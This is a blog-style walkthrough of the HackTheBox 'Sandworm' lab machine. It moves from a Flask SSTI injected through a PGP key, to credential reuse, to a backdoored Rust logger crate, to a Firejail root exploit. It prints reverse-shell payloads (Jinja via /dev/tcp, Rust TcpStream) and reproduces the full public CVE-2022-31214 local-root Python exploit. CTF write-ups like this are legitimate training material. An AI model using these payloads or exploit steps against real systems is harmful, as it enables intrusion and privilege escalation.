---
layout: post
title: Sandworm - Medium - Linux
date: 17-06-2023
categories: [CTF - HackTheBox]
tag: [PGP, SSTI, Firejail, Rust]
---

At first it appeared to be a crypto challenge as it advertised PGP heavily. After some trial and error and realising the web application was built in flask it strongly hinted towards SSTI. The path to foothold involved creating a PGP key with the SSTI payload within properties of the key. Once a reverse shell was obtained it was clear Firejail was installed and limiting the current user (atlas). After checking the file system it was possible to read a JSON file containing the credentials of another user (silentobserver).

There was an automated task running a custom binary written in rust every minute. This binary called a module called logger. It just so happened silentobserver could modify the source to the logger module in the opt directory. After altering the code with a reverse shell and using cargo to build the crate a reverse shell returned when the automated task triggered. The shell was granted as the atlas user however there were no Firejail restrictions.

Atlas was part of a group called jailer which had full control over Firejail. The path to root involved taking advantage of a vulnerability within Firejail. Overall quite a difficult medium machine.

## Nmap Scan:

```bash
# Nmap 7.93 scan initiated Sat Jun 17 21:02:46 2023 as: nmap -sC -sV -p- -oA nmap/sandworm -v 10.129.168.10
Nmap scan report for 10.129.168.10
Host is up (0.027s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://ssa.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Issuer: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-04T18:03:25
| Not valid after:  2050-09-19T18:03:25
| MD5:   b8b7487ef3e214a4999ef842014159a1
|_SHA-1: 80d923678d7b43b2526d5d6100bd66e948ddc223
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 17 21:03:29 2023 -- 1 IP address (1 host up) scanned in 42.21 seconds
```

## Web Browser - Port 80 - https://ssa.htb/

![a7266345e03ead2965136c44ac781e50.png](/assets/img/a7266345e03ead2965136c44ac781e50.png)

## Web Browser - Port 80 - https://ssa.htb/contact

![40d68866edc4aa0752052bd396ebac0e.png](/assets/img/40d68866edc4aa0752052bd396ebac0e.png)

## Web Browser - Port 80 - https://ssa.htb/guide

![c8aeda58da14e83055e08b128f5ced89.png](/assets/img/c8aeda58da14e83055e08b128f5ced89.png)

## PGP Key Payload

![fe0ece47ba431623860993c360a0877e.png](/assets/img/fe0ece47ba431623860993c360a0877e.png)

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.10/9001 0>&1"').read() }}
```

## Burp Request

```
POST /process HTTP/1.1
Host: ssa.htb
Cookie: remember_token=2|01f77b08cee823a53c763ad3369a8238722666b02b60f2339fcf5ad0f09acc10ec12021789b8bbb761e2967f294dc3ff39ad9ba858a11f6fbe7073a2c4cc9b83; session=eyJfZnJlc2giOmZhbHNlLCJfdXNlcl9pZCI6IjIifQ.ZI9avg.6k9o7nVwG6f2LaAQEo62qKBoyUo
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ssa.htb/guide
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1247
Origin: https://ssa.htb
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

signed_text=-----BEGIN+PGP+SIGNED+MESSAGE-----%0AHash%3A+SHA512%0A%0Atest%0A-----BEGIN+PGP+SIGNATURE-----%0A%0AiLMEAQEKAB0WIQQs%2F7ykENK1cMsl53IG20aly7lULAUCZI9rawAKCRAG20aly7lU%0ALK8%2FA%2F4zMETaiUWCoMTiZ73384LuDHt8I%2Fe3L8vPb%2BpGusjuDHFWyI4SmYKkG9od%0AiTDVgg%2BOvDwjM8W%2FJPZYWCkLShoTemzAbKzW8Wx9Zp%2B36PYeWu3BQlejJBeqp3Or%0AJu%2FUModIBeokCBJMsl4uGqvIQ2jwdmeRrT9mpzgiBxsOc7PdRA%3D%3D%0A%3DB7mK%0A-----END+PGP+SIGNATURE-----&public_key=-----BEGIN+PGP+PUBLIC+KEY+BLOCK-----%0A%0AmI0EZI5YnAEEANSXXk%2FQsApldWgbFjGjGSv%2B8yzrjk1BtmZSbziq%2F5qX8OMZfsCz%0AlXGI4IViffXcJeTAjk5Iu0VwmdVyIgkr8jHbyXlUzV9%2F9R%2FWhfhuCKdXIsSdmCFq%0AIoK6fXwHmmGsXtRJ0IPjeKAoWIsup%2Fnxoi96fmmI6teHSdn1k5wv0n4TABEBAAG0%0AkXt7IHNlbGYuX19pbml0X18uX19nbG9iYWxzX18uX19idWlsdGluc19fLl9faW1w%0Ab3J0X18oJ29zJykucG9wZW4oJ2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3Av%0AMTAuMTAuMTQuMTAvOTAwMSAwPiYxIicpLnJlYWQoKSB9fSA8dGVzdEB0ZXN0LmNv%0AbT6IzgQTAQoAOBYhBCz%2FvKQQ0rVwyyXncgbbRqXLuVQsBQJkjlicAhsvBQsJCAcC%0ABhUKCQgLAgQWAgMBAh4BAheAAAoJEAbbRqXLuVQs%2Fm0EAKl3euZ64UbA3YbjFPei%0A583oJy7zooPfPcX3vubfBhFCXmzDkGfu7EJeL23YKc9HGvsa3qtrB9E85vc8ujV%2F%0AuTx3u%2BPHHypNLu2o9cIyWC2VGHRO%2F4KOkaTbg%2FI9wF7WfKC6DHV6m%2B8qVLRccDOJ%0Ad7Wgc7RDZblQnsE3RWxONzfH%0A%3Dil2H%0A-----END+PGP+PUBLIC+KEY+BLOCK-----
```

## Reverse Shell Returned (user: atlas)

![dd43b24ba9b3765866da1589815d5257.png](/assets/img/dd43b24ba9b3765866da1589815d5257.png)

## Firejail is limiting user atlas

```bash
atlas@sandworm:~/.config$ ls -la
ls -la
total 12
drwxrwxr-x 4 atlas  atlas   4096 Jan 15 07:48 .
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 ..
dr-------- 2 nobody nogroup   40 Jun 18 19:25 firejail
drwxrwxr-x 3 nobody atlas   4096 Jan 15 07:48 httpie
```

## Credentials for user silentobserver found

```json
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json
cat admin.json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLikethe*****",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

## SSH - silentobserver - captured user flag

```bash
silentobserver@sandworm:~$ ls -la
total 40
drwxr-x--- 6 silentobserver silentobserver 4096 Jun  6 08:52 .
drwxr-xr-x 4 root           root           4096 May  4 15:19 ..
lrwxrwxrwx 1 root           root              9 Nov 22  2022 .bash_history -> /dev/null
-rw-r--r-- 1 silentobserver silentobserver  220 Nov 22  2022 .bash_logout
-rw-r--r-- 1 silentobserver silentobserver 3771 Nov 22  2022 .bashrc
drwx------ 2 silentobserver silentobserver 4096 May  4 15:26 .cache
drwxrwxr-x 3 silentobserver silentobserver 4096 May  4 16:59 .cargo
drwx------ 4 silentobserver silentobserver 4096 May  4 15:22 .gnupg
drwx------ 4 silentobserver silentobserver 4096 Nov 22  2022 .local
-rw-r--r-- 1 silentobserver silentobserver  807 Nov 22  2022 .profile
-rw-r----- 1 root           silentobserver   33 Jun 18 19:26 user.txt
```

## Reviewing /opt/tipnet/src/main.rs

```rust
logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");
```

After reviewing the code it makes call to the logger module every couple of minutes.

## SUID Permissions on /opt/tipnet/target/debug/tipnet

```bash
-rwsrwxr-x   2 atlas atlas 59047248 Jun  6 10:00 tipnet
```

## Reviewing /opt/crates/logger/src/lib.rs

```rust
silentobserver@sandworm:/opt/crates/logger/src$ cat lib.rs
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

## Permissions on /opt/crates/logger/src/

```bash
silentobserver@sandworm:/opt/crates/logger$ ls -la
total 40
drwxr-xr-x 5 atlas silentobserver  4096 May  4 17:08 .
drwxr-xr-x 3 root  atlas           4096 May  4 17:26 ..
drwxrwxr-x 6 atlas silentobserver  4096 May  4 17:08 .git
-rw-rw-r-- 1 atlas silentobserver    20 May  4 17:08 .gitignore
-rw-r--r-- 1 atlas silentobserver 11644 May  4 17:11 Cargo.lock
-rw-r--r-- 1 atlas silentobserver   190 May  4 17:08 Cargo.toml
drwxrwxr-x 2 atlas silentobserver  4096 May  4 17:12 src
drwxrwxr-x 3 atlas silentobserver  4096 May  4 17:08 target
```

Its possible to overwrite the lib.rs file with a modified version. Next step is to modify lib.rs to execute a reverse shell and compile it.

### Reverse Shell Payload - lib.rs

```rust
use std:: fs:: OpenOptions;
use std:: io:: Write;
use chrono:: prelude::*;
use std:: net:: TcpStream;
use std:: os:: unix:: io:: { AsRawFd, FromRawFd };
use std:: process:: { Command, Stdio };

extern crate chrono;

pub fn log(user: & str, query: & str, justification: & str) {

let sock = TcpStream:: connect("10.10.14.10:9001").unwrap();

// a tcp socket as a raw file descriptor
// a file descriptor is the number that uniquely identifies an open file in a computer's operating system
// When a program asks to open a file/other resource (network socket, etc.) the kernel:
// 1. Grants access
// 2. Creates an entry in the global file table
// 3. Provides the software with the location of that entry (file descriptor)
// https://www.computerhope.com/jargon/f/file-descriptor.htm

let fd = sock.as_raw_fd();

// so basically, writing to a tcp socket is just like writing something to a file!
// the main difference being that there is a client over the network reading the file at the same time!

Command:: new ("/bin/bash")
.arg("-i")
.stdin(unsafe { Stdio:: from_raw_fd(fd) })
.stdout(unsafe { Stdio:: from_raw_fd(fd) })
.stderr(unsafe { Stdio:: from_raw_fd(fd) })
.spawn()
.unwrap()
.wait()
.unwrap();

let now = Local:: now();
let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

let mut file = match OpenOptions::new ().append(true).create(true).open("/opt/tipnet/access.log") {
Ok(file) => file,
Err(e) => {
println!("Error opening log file: {}", e);
return;
}

};  

if let Err(e) = file.write_all(log_message.as_bytes()) {

println!("Error writing to log file: {}", e);

}  
```

## Building modified logger module

```bash
silentobserver@sandworm:~$ cp lib.rs /opt/crates/logger/src/
```

```bash
silentobserver@sandworm:/opt/crates/logger$ cargo build
   Compiling autocfg v1.1.0
   Compiling libc v0.2.142
   Compiling num-traits v0.2.15
   Compiling num-integer v0.1.45
   Compiling time v0.1.45
   Compiling iana-time-zone v0.1.56
   Compiling chrono v0.4.24
   Compiling logger v0.1.0 (/opt/crates/logger)
    Finished dev [unoptimized + debuginfo] target(s) in 9.44s
```

## Reverse Shell returned as user atlas (escaped jail)

```bash
 nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.10] from (UNKNOWN) [10.129.168.138] 37198
bash: cannot set terminal process group (3668): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$
```

## PE - Firejail Exploitation (CVE-2022-31214)
After escaping from the jail user atlas is part of the jailer group. Atlas user is able to execute firejail.
```bash
-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 /usr/local/bin/firejail
```

```bash
atlas@sandworm:/opt/tipnet$ groups
groups
atlas jailer
```
Checking the version of firejail to see if any CVE's exist.
```bash
atlas@sandworm:/opt/tipnet$ firejail --version
firejail --version
firejail version 0.9.68
```
Firejail version is 0.9.68 which is vulerable. Below is a copy of the python code to exploit the CVE.
```python
#!/usr/bin/python3

# Author: Matthias Gerstner <matthias.gerstner@suse.com>
#
# Proof of concept local root exploit for a vulnerability in Firejail 0.9.68
# in joining Firejail instances.
#
# Prerequisites:
# - the firejail setuid-root binary needs to be installed and accessible to the
#   invoking user
#
# Exploit: The exploit tricks the Firejail setuid-root program to join a fake
# Firejail instance. By using tmpfs mounts and symlinks in the unprivileged
# user namespace of the fake Firejail instance the result will be a shell that
# lives in an attacker controller mount namespace while the user namespace is
# still the initial user namespace and the nonewprivs setting is unset,
# allowing to escalate privileges via su or sudo.

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) == 0:
        printe(f"{__file__} needs to have the execute bit set for the exploit to work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
        line = line.decode('utf8').strip().lower()
        if line.find("child pid") == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sandbox")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f"failed to determine sleep child PID from helper sandbox: {kids}")

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from helper sandbox")
    else:
        raise Exception(f"sleep child process did not come into existence in {children}")

    join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not found at {join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] = join_file
    os.environ["FIREJOIN_UNSHARED"] = "1"

    unshare = shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline = "unshare -U -r -m".split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src = "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.")

while True:
    line = sys.stdin.readline()
    if not line:
        break
```

Copied SSH keys over to atlas home directory to create two sessions. Copied over the python exploit and gave it executable permissions.

```bash
atlas@sandworm:~$ chmod +x exploit.py 
atlas@sandworm:~$ python3 exploit.py 
You can now run 'firejail --join=4689' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

Ran the command as instructed in the second session and then used su to change to root. Atlas user was not part of sudo group so it threw an error. Simply using su resolved the issue.

```bash
atlas@sandworm:~$ firejail --join=4689
changing root to /proc/4689/root
Warning: cleaning all supplementary groups
Child process initialized in 6.78 ms
atlas@sandworm:~$ su
root@sandworm:/home/atlas# id
uid=0(root) gid=0(root) groups=0(root)
root@sandworm:/home/atlas# cat /root/root.txt
724c47373a08b8471ab6af8be2c95adb
root@sandworm:/home/atlas# 
```

Root flag captured.